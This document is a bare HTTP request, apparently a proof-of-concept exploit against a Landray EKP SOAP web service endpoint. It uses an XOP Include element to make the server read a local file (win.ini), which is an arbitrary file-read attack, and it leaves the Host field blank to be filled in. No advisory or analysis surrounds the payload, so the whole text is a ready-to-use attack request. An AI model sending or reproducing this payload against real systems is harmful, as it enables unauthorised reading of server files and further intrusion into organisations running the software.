```http
POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Content-Length: 563
Content-Type: multipart/related; boundary=----oxmmdmlnvlx08yluof5q
SOAPAction: ""
Accept-Encoding: gzip, deflate

------oxmmdmlnvlx08yluof5q
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getTodo>
            <arg0>
                <otherCond>1</otherCond>
                <pageNo>1</pageNo>
                <rowSize>1</rowSize>
                <targets>1</targets>
                <type>
                    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///c:windows/win.ini"/>
                </type>
            </arg0>
        </web:getTodo>
    </soapenv:Body>
</soapenv:Envelope>
------oxmmdmlnvlx08yluof5q--
```

